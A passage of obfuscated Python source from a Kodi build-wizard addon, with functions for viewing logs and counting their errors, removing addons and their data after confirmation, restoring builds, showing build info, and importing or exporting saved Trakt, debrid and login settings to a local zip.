			OO0OO00OO0OOOOO0O =OOO00OO00000O0OOO [-1 ]#line:4105
		elif len (OOO00OO00000O0OOO [-2 ])>5 :#line:4106
			OO0OO00OO0OOOOO0O =OOO00OO00000O0OOO [-2 ]#line:4107
	wiz .log ("YouTube URL: %s"%OO0OO00OO0OOOOO0O )#line:4108
	yt .PlayVideo (OO0OO00OO0OOOOO0O )#line:4109
def viewLogFile ():#line:4111
	O00OOOOOOOO00O0OO =wiz .Grab_Log (True )#line:4112
	OOOO0O0O00OO0OO0O =wiz .Grab_Log (True ,True )#line:4113
	O00OOO0OOO0OO00O0 =0 ;O0OOOOO00OOO0O000 =O00OOOOOOOO00O0OO #line:4114
	if not OOOO0O0O00OO0OO0O ==False and not O00OOOOOOOO00O0OO ==False :#line:4115
		O00OOO0OOO0OO00O0 =DIALOG .select (ADDONTITLE ,["View %s"%O00OOOOOOOO00O0OO .replace (LOG ,""),"View %s"%OOOO0O0O00OO0OO0O .replace (LOG ,"")])#line:4116
		if O00OOO0OOO0OO00O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4117
	elif O00OOOOOOOO00O0OO ==False and OOOO0O0O00OO0OO0O ==False :#line:4118
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4119
		return #line:4120
	elif not O00OOOOOOOO00O0OO ==False :O00OOO0OOO0OO00O0 =0 #line:4121
	elif not OOOO0O0O00OO0OO0O ==False :O00OOO0OOO0OO00O0 =1 #line:4122
	O0OOOOO00OOO0O000 =O00OOOOOOOO00O0OO if O00OOO0OOO0OO00O0 ==0 else OOOO0O0O00OO0OO0O #line:4124
	O000O00O0000OO000 =wiz .Grab_Log (False )if O00OOO0OOO0OO00O0 ==0 else wiz .Grab_Log (False ,True )#line:4125
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0OOOOO00OOO0O000 ),O000O00O0000OO000 )#line:4127
def errorChecking (log =None ,count =None ,all =None ):#line:4129
	if log ==None :#line:4130
		O000000OO00000OO0 =wiz .Grab_Log (True )#line:4131
		OO000OOOOOOO0OOOO =wiz .Grab_Log (True ,True )#line:4132
		if not OO000OOOOOOO0OOOO ==False and not O000000OO00000OO0 ==False :#line:4133
			O00O00000O0000000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O000000OO00000OO0 .replace (LOG ,""),errorChecking (O000000OO00000OO0 ,True ,True )),"View %s: %s error(s)"%(OO000OOOOOOO0OOOO .replace (LOG ,""),errorChecking (OO000OOOOOOO0OOOO ,True ,True ))])#line:4134
			if O00O00000O0000000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4135
		elif O000000OO00000OO0 ==False and OO000OOOOOOO0OOOO ==False :#line:4136
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4137
			return #line:4138
		elif not O000000OO00000OO0 ==False :O00O00000O0000000 =0 #line:4139
		elif not OO000OOOOOOO0OOOO ==False :O00O00000O0000000 =1 #line:4140
		log =O000000OO00000OO0 if O00O00000O0000000 ==0 else OO000OOOOOOO0OOOO #line:4141
	if log ==False :#line:4142
		if count ==None :#line:4143
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4144
			return False #line:4145
		else :#line:4146
			return 0 #line:4147
	else :#line:4148
		if os .path .exists (log ):#line:4149
			O00OO00O00O00O0O0 =open (log ,mode ='r');OO0O00OOO0OOO00OO =O00OO00O00O00O0O0 .read ().replace ('\n','').replace ('\r','');O00OO00O00O00O0O0 .close ()#line:4150
			O00OOO0O0000000O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0O00OOO0OOO00OO )#line:4151
			if not count ==None :#line:4152
				if all ==None :#line:4153
					O0000000OO00O00O0 =0 #line:4154
					for O0000000O00O0O0OO in O00OOO0O0000000O0 :#line:4155
						if ADDON_ID in O0000000O00O0O0OO :O0000000OO00O00O0 +=1 #line:4156
					return O0000000OO00O00O0 #line:4157
				else :return len (O00OOO0O0000000O0 )#line:4158
			if len (O00OOO0O0000000O0 )>0 :#line:4159
				O0000000OO00O00O0 =0 ;OOOOOOOO0OOO0O0OO =""#line:4160
				for O0000000O00O0O0OO in O00OOO0O0000000O0 :#line:4161
					if all ==None and not ADDON_ID in O0000000O00O0O0OO :continue #line:4162
					else :#line:4163
						O0000000OO00O00O0 +=1 #line:4164
						OOOOOOOO0OOO0O0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000000OO00O00O0 ,O0000000O00O0O0OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4165
				if O0000000OO00O00O0 >0 :#line:4166
					wiz .TextBox (ADDONTITLE ,OOOOOOOO0OOO0O0OO )#line:4167
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4168
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4169
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4170
ACTION_PREVIOUS_MENU =10 #line:4172
ACTION_NAV_BACK =92 #line:4173
ACTION_MOVE_LEFT =1 #line:4174
ACTION_MOVE_RIGHT =2 #line:4175
ACTION_MOVE_UP =3 #line:4176
ACTION_MOVE_DOWN =4 #line:4177
ACTION_MOUSE_WHEEL_UP =104 #line:4178
ACTION_MOUSE_WHEEL_DOWN =105 #line:4179
ACTION_MOVE_MOUSE =107 #line:4180
ACTION_SELECT_ITEM =7 #line:4181
ACTION_BACKSPACE =110 #line:4182
ACTION_MOUSE_LEFT_CLICK =100 #line:4183
ACTION_MOUSE_LONG_CLICK =108 #line:4184
def LogViewer (default =None ):#line:4186
	class O000OO0O000000OOO (xbmcgui .WindowXMLDialog ):#line:4187
		def __init__ (O000OOOOO000OOO0O ,*O0O00O00OO0O0OOO0 ,**O000O0OO0O0OOO0O0 ):#line:4188
			O000OOOOO000OOO0O .default =O000O0OO0O0OOO0O0 ['default']#line:4189
		def onInit (O0OOOO0OOO0000O0O ):#line:4191
			O0OOOO0OOO0000O0O .title =101 #line:4192
			O0OOOO0OOO0000O0O .msg =102 #line:4193
			O0OOOO0OOO0000O0O .scrollbar =103 #line:4194
			O0OOOO0OOO0000O0O .upload =201 #line:4195
			O0OOOO0OOO0000O0O .kodi =202 #line:4196
			O0OOOO0OOO0000O0O .kodiold =203 #line:4197
			O0OOOO0OOO0000O0O .wizard =204 #line:4198
			O0OOOO0OOO0000O0O .okbutton =205 #line:4199
			OOO0O00O00OO000OO =open (O0OOOO0OOO0000O0O .default ,'r')#line:4200
			O0OOOO0OOO0000O0O .logmsg =OOO0O00O00OO000OO .read ()#line:4201
			OOO0O00O00OO000OO .close ()#line:4202
			O0OOOO0OOO0000O0O .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOOO0OOO0000O0O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4203
			O0OOOO0OOO0000O0O .showdialog ()#line:4204
		def showdialog (O0OO00O00O0OOO00O ):#line:4206
			O0OO00O00O0OOO00O .getControl (O0OO00O00O0OOO00O .title ).setLabel (O0OO00O00O0OOO00O .titlemsg )#line:4207
			O0OO00O00O0OOO00O .getControl (O0OO00O00O0OOO00O .msg ).setText (wiz .highlightText (O0OO00O00O0OOO00O .logmsg ))#line:4208
			O0OO00O00O0OOO00O .setFocusId (O0OO00O00O0OOO00O .scrollbar )#line:4209
		def onClick (OO0OO0000O0OOO000 ,O00O0000OO000OOOO ):#line:4211
			if O00O0000OO000OOOO ==OO0OO0000O0OOO000 .okbutton :OO0OO0000O0OOO000 .close ()#line:4212
			elif O00O0000OO000OOOO ==OO0OO0000O0OOO000 .upload :OO0OO0000O0OOO000 .close ();uploadLog .Main ()#line:4213
			elif O00O0000OO000OOOO ==OO0OO0000O0OOO000 .kodi :#line:4214
				O0OO0OOOOO0OO0O0O =wiz .Grab_Log (False )#line:4215
				OO00000OO0OO0O00O =wiz .Grab_Log (True )#line:4216
				if O0OO0OOOOO0OO0O0O ==False :#line:4217
					OO0OO0000O0OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4218
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4219
				else :#line:4220
					OO0OO0000O0OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000OO0OO0O00O .replace (LOG ,''))#line:4221
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .title ).setLabel (OO0OO0000O0OOO000 .titlemsg )#line:4222
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText (wiz .highlightText (O0OO0OOOOO0OO0O0O ))#line:4223
					OO0OO0000O0OOO000 .setFocusId (OO0OO0000O0OOO000 .scrollbar )#line:4224
			elif O00O0000OO000OOOO ==OO0OO0000O0OOO000 .kodiold :#line:4225
				O0OO0OOOOO0OO0O0O =wiz .Grab_Log (False ,True )#line:4226
				OO00000OO0OO0O00O =wiz .Grab_Log (True ,True )#line:4227
				if O0OO0OOOOO0OO0O0O ==False :#line:4228
					OO0OO0000O0OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4229
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4230
				else :#line:4231
					OO0OO0000O0OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000OO0OO0O00O .replace (LOG ,''))#line:4232
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .title ).setLabel (OO0OO0000O0OOO000 .titlemsg )#line:4233
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText (wiz .highlightText (O0OO0OOOOO0OO0O0O ))#line:4234
					OO0OO0000O0OOO000 .setFocusId (OO0OO0000O0OOO000 .scrollbar )#line:4235
			elif O00O0000OO000OOOO ==OO0OO0000O0OOO000 .wizard :#line:4236
				O0OO0OOOOO0OO0O0O =wiz .Grab_Log (False ,False ,True )#line:4237
				OO00000OO0OO0O00O =wiz .Grab_Log (True ,False ,True )#line:4238
				if O0OO0OOOOO0OO0O0O ==False :#line:4239
					OO0OO0000O0OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4240
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4241
				else :#line:4242
					OO0OO0000O0OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00000OO0OO0O00O .replace (ADDONDATA ,''))#line:4243
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .title ).setLabel (OO0OO0000O0OOO000 .titlemsg )#line:4244
					OO0OO0000O0OOO000 .getControl (OO0OO0000O0OOO000 .msg ).setText (wiz .highlightText (O0OO0OOOOO0OO0O0O ))#line:4245
					OO0OO0000O0OOO000 .setFocusId (OO0OO0000O0OOO000 .scrollbar )#line:4246
		def onAction (O0000OO00O0OO0O00 ,O0000OO00O000OOO0 ):#line:4248
			if O0000OO00O000OOO0 ==ACTION_PREVIOUS_MENU :O0000OO00O0OO0O00 .close ()#line:4249
			elif O0000OO00O000OOO0 ==ACTION_NAV_BACK :O0000OO00O0OO0O00 .close ()#line:4250
	if default ==None :default =wiz .Grab_Log (True )#line:4251
	O00OO0O0OOOO0O000 =O000OO0O000000OOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4252
	O00OO0O0OOOO0O000 .doModal ()#line:4253
	del O00OO0O0OOOO0O000 #line:4254
def removeAddon (O00O0O0000000O0O0 ,OOO0O0OO0OO00O0OO ,over =False ):#line:4256
	if not over ==False :#line:4257
		O00O000000OO0O000 =1 #line:4258
	else :#line:4259
		O00O000000OO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0OO0OO00O0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00O0O0000000O0O0 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4260
	if O00O000000OO0O000 ==1 :#line:4261
		O0OO00OOO000OOO00 =os .path .join (ADDONS ,O00O0O0000000O0O0 )#line:4262
		wiz .log ("Removing Addon %s"%O00O0O0000000O0O0 )#line:4263
		wiz .cleanHouse (O0OO00OOO000OOO00 )#line:4264
		xbmc .sleep (1000 )#line:4265
		try :shutil .rmtree (O0OO00OOO000OOO00 )#line:4266
		except Exception as O0O0O0OOO0OOO00O0 :wiz .log ("Error removing %s"%O00O0O0000000O0O0 ,xbmc .LOGNOTICE )#line:4267
		removeAddonData (O00O0O0000000O0O0 ,OOO0O0OO0OO00O0OO ,over )#line:4268
	if over ==False :#line:4269
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOO0O0OO0OO00O0OO ))#line:4270
def removeAddonData (O0O000O0000OOOOO0 ,name =None ,over =False ):#line:4272
	if O0O000O0000OOOOO0 =='all':#line:4273
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4274
			wiz .cleanHouse (ADDOND )#line:4275
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4276
	elif O0O000O0000OOOOO0 =='uninstalled':#line:4277
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4278
			OO000O0O00O0OO0O0 =0 #line:4279
			for O00O0OO00O0OO0OO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4280
				O00OOO0OOO00O00OO =O00O0OO00O0OO0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4281
				if O00OOO0OOO00O00OO in EXCLUDES :pass #line:4282
				elif os .path .exists (os .path .join (ADDONS ,O00OOO0OOO00O00OO )):pass #line:4283
				else :wiz .cleanHouse (O00O0OO00O0OO0OO0 );OO000O0O00O0OO0O0 +=1 ;wiz .log (O00O0OO00O0OO0OO0 );shutil .rmtree (O00O0OO00O0OO0OO0 )#line:4284
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO000O0O00O0OO0O0 ))#line:4285
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4286
	elif O0O000O0000OOOOO0 =='empty':#line:4287
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4288
			OO000O0O00O0OO0O0 =wiz .emptyfolder (ADDOND )#line:4289
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO000O0O00O0OO0O0 ))#line:4290
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4291
	else :#line:4292
		O00O00O0O00O000O0 =os .path .join (USERDATA ,'addon_data',O0O000O0000OOOOO0 )#line:4293
		if O0O000O0000OOOOO0 in EXCLUDES :#line:4294
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4295
		elif os .path .exists (O00O00O0O00O000O0 ):#line:4296
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O000O0000OOOOO0 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4297
				wiz .cleanHouse (O00O00O0O00O000O0 )#line:4298
				try :#line:4299
					shutil .rmtree (O00O00O0O00O000O0 )#line:4300
				except :#line:4301
					wiz .log ("Error deleting: %s"%O00O00O0O00O000O0 )#line:4302
			else :#line:4303
				wiz .log ('Addon data for %s was not removed'%O0O000O0000OOOOO0 )#line:4304
	wiz .refresh ()#line:4305
def restoreit (O00O0O0OOO0O00OO0 ):#line:4307
	if O00O0O0OOO0O00OO0 =='build':#line:4308
		O0OOOOO0000OO0O0O =freshStart ('restore')#line:4309
		if O0OOOOO0000OO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4310
	if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:4311
		wiz .skinToDefault ()#line:4312
	wiz .restoreLocal (O00O0O0OOO0O00OO0 )#line:4313
def restoreextit (O0O00O00000O0OOO0 ):#line:4315
	if O0O00O00000O0OOO0 =='build':#line:4316
		O0O000O0OO00OOOO0 =freshStart ('restore')#line:4317
		if O0O000O0OO00OOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4318
	wiz .restoreExternal (O0O00O00000O0OOO0 )#line:4319
def buildInfo (O0O000OO0000000O0 ):#line:4321
	if wiz .workingURL (SPEEDFILE )==True :#line:4322
		if wiz .checkBuild (O0O000OO0000000O0 ,'url'):#line:4323
			O0O000OO0000000O0 ,OO00O00000O0OO0O0 ,O0OO0OO0O0000OOO0 ,O0OOO00O00O0O00O0 ,OO0OO0OO0O000O00O ,OO00OO0O000OO0O0O ,O00000O000O00O000 ,OO0OO00O000O000OO ,OOOOOO0OOO0O00OO0 ,O0OOO0O00O00O0O0O ,O0OOO00OOO00O0OO0 =wiz .checkBuild (O0O000OO0000000O0 ,'all')#line:4324
			O0OOO0O00O00O0O0O ='Yes'if O0OOO0O00O00O0O0O .lower ()=='yes'else 'No'#line:4325
			O00O0O00OO000OOOO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O000OO0000000O0 )#line:4326
			O00O0O00OO000OOOO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00O00000O0OO0O0 )#line:4327
			if not OO00OO0O000OO0O0O =="http://":#line:4328
				OOO0OO00OO0000OOO =wiz .themeCount (O0O000OO0000000O0 ,False )#line:4329
				O00O0O00OO000OOOO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOO0OO00OO0000OOO ))#line:4330
			O00O0O00OO000OOOO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO0OO0O000O00O )#line:4331
			O00O0O00OO000OOOO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO0O00O00O0O0O )#line:4332
			O00O0O00OO000OOOO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOO00OOO00O0OO0 )#line:4333
			wiz .TextBox (ADDONTITLE ,O00O0O00OO000OOOO )#line:4334
		else :wiz .log ("Invalid Build Name!")#line:4335
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4336
def buildVideo (O0O00O00OO0000000 ):#line:4338
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4339
	if wiz .workingURL (SPEEDFILE )==True :#line:4340
		OO0OOO00O00O00OOO =wiz .checkBuild (O0O00O00OO0000000 ,'preview')#line:4341
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0O00O00OO0000000 )#line:4342
		if OO0OOO00O00O00OOO and not OO0OOO00O00O00OOO =='http://':playVideo (OO0OOO00O00O00OOO )#line:4343
		else :wiz .log ("[%s]Unable to find url for video preview"%O0O00O00OO0000000 )#line:4344
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4345
def dependsList (O0OO0OO0000O00O00 ):#line:4347
	OO0OO0OOOOOO00OOO =os .path .join (ADDONS ,O0OO0OO0000O00O00 ,'addon.xml')#line:4348
	if os .path .exists (OO0OO0OOOOOO00OOO ):#line:4349
		OO0OOO00O00OOOO0O =open (OO0OO0OOOOOO00OOO ,mode ='r');O00000OO0O0O000OO =OO0OOO00O00OOOO0O .read ();OO0OOO00O00OOOO0O .close ();#line:4350
		O0OOO000O000OOO00 =wiz .parseDOM (O00000OO0O0O000OO ,'import',ret ='addon')#line:4351
		OO0O00OO000O00OO0 =[]#line:4352
		for O00O0OO0O0OOO0O0O in O0OOO000O000OOO00 :#line:4353
			if not 'xbmc.python'in O00O0OO0O0OOO0O0O :#line:4354
				OO0O00OO000O00OO0 .append (O00O0OO0O0OOO0O0O )#line:4355
		return OO0O00OO000O00OO0 #line:4356
	return []#line:4357
def manageSaveData (O00O0OO0OO00O0O0O ):#line:4359
	if O00O0OO0OO00O0O0O =='import':#line:4360
		OO0O000OO0OOOOOO0 =os .path .join (ADDONDATA ,'temp')#line:4361
		if not os .path .exists (OO0O000OO0OOOOOO0 ):os .makedirs (OO0O000OO0OOOOOO0 )#line:4362
		OOOOOO0OOO0OO0000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4363
		if not OOOOOO0OOO0OO0000 .endswith ('.zip'):#line:4364
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4365
			return #line:4366
		O000000OO00O00OOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4367
		O0OO0O0OO0000OOOO =xbmcvfs .copy (OOOOOO0OOO0OO0000 ,O000000OO00O00OOO )#line:4368
		wiz .log ("%s"%str (O0OO0O0OO0000OOOO ))#line:4369
		extract .all (xbmc .translatePath (O000000OO00O00OOO ),OO0O000OO0OOOOOO0 )#line:4370
		O0O00OO0O0OOOOOO0 =os .path .join (OO0O000OO0OOOOOO0 ,'trakt')#line:4371
		OOO0000000OO000O0 =os .path .join (OO0O000OO0OOOOOO0 ,'login')#line:4372
		O0O0OOOO0O0OOOO00 =os .path .join (OO0O000OO0OOOOOO0 ,'debrid')#line:4373
		OOO00O00OOOOOOO00 =0 #line:4374
		if os .path .exists (O0O00OO0O0OOOOOO0 ):#line:4375
			OOO00O00OOOOOOO00 +=1 #line:4376
			OOOO0OO0OO0OO0000 =os .listdir (O0O00OO0O0OOOOOO0 )#line:4377
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4378
			for O0OO0O000000000OO in OOOO0OO0OO0OO0000 :#line:4379
				O0OOO0O0O0O000O00 =os .path .join (traktit .TRAKTFOLD ,O0OO0O000000000OO )#line:4380
				O00000000O000OOOO =os .path .join (O0O00OO0O0OOOOOO0 ,O0OO0O000000000OO )#line:4381
				if os .path .exists (O0OOO0O0O0O000O00 ):#line:4382
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OO0O000000000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4383
					else :os .remove (O0OOO0O0O0O000O00 )#line:4384
				shutil .copy (O00000000O000OOOO ,O0OOO0O0O0O000O00 )#line:4385
			traktit .importlist ('all')#line:4386
			traktit .traktIt ('restore','all')#line:4387
		if os .path .exists (OOO0000000OO000O0 ):#line:4388
			OOO00O00OOOOOOO00 +=1 #line:4389
			OOOO0OO0OO0OO0000 =os .listdir (OOO0000000OO000O0 )#line:4390
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4391
			for O0OO0O000000000OO in OOOO0OO0OO0OO0000 :#line:4392
				O0OOO0O0O0O000O00 =os .path .join (loginit .LOGINFOLD ,O0OO0O000000000OO )#line:4393
				O00000000O000OOOO =os .path .join (OOO0000000OO000O0 ,O0OO0O000000000OO )#line:4394
				if os .path .exists (O0OOO0O0O0O000O00 ):#line:4395
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OO0O000000000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4396
					else :os .remove (O0OOO0O0O0O000O00 )#line:4397
				shutil .copy (O00000000O000OOOO ,O0OOO0O0O0O000O00 )#line:4398
			loginit .importlist ('all')#line:4399
			loginit .loginIt ('restore','all')#line:4400
		if os .path .exists (O0O0OOOO0O0OOOO00 ):#line:4401
			OOO00O00OOOOOOO00 +=1 #line:4402
			OOOO0OO0OO0OO0000 =os .listdir (O0O0OOOO0O0OOOO00 )#line:4403
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4404
			for O0OO0O000000000OO in OOOO0OO0OO0OO0000 :#line:4405
				O0OOO0O0O0O000O00 =os .path .join (debridit .REALFOLD ,O0OO0O000000000OO )#line:4406
				O00000000O000OOOO =os .path .join (O0O0OOOO0O0OOOO00 ,O0OO0O000000000OO )#line:4407
				if os .path .exists (O0OOO0O0O0O000O00 ):#line:4408
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0OO0O000000000OO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4409
					else :os .remove (O0OOO0O0O0O000O00 )#line:4410
				shutil .copy (O00000000O000OOOO ,O0OOO0O0O0O000O00 )#line:4411
			debridit .importlist ('all')#line:4412
			debridit .debridIt ('restore','all')#line:4413
		wiz .cleanHouse (OO0O000OO0OOOOOO0 )#line:4414
		wiz .removeFolder (OO0O000OO0OOOOOO0 )#line:4415
		os .remove (O000000OO00O00OOO )#line:4416
		if OOO00O00OOOOOOO00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4417
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4418
	elif O00O0OO0OO00O0O0O =='export':#line:4419
		O00OO0OOO0OO0OO00 =xbmc .translatePath (MYBUILDS )#line:4420
		OOO00OO0OOOOO0O0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4421
		traktit .traktIt ('update','all')#line:4422
		loginit .loginIt ('update','all')#line:4423
		debridit .debridIt ('update','all')#line:4424
		OOOOOO0OOO0OO0000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4425
		OOOOOO0OOO0OO0000 =xbmc .translatePath (OOOOOO0OOO0OO0000 )#line:4426
		OO00000O00OOOO0O0 =os .path .join (O00OO0OOO0OO0OO00 ,'SaveData.zip')#line:4427
		O0O0O0OOO0OO00000 =zipfile .ZipFile (OO00000O00OOOO0O0 ,mode ='w')#line:4428
		for O00O0O0O00O00OO0O in OOO00OO0OOOOO0O0O :#line:4429
			if os .path .exists (O00O0O0O00O00OO0O ):#line:4430
				OOOO0OO0OO0OO0000 =os .listdir (O00O0O0O00O00OO0O )#line:4431
				for OO0O0OOO00OOOOO0O in OOOO0OO0OO0OO0000 :#line:4432
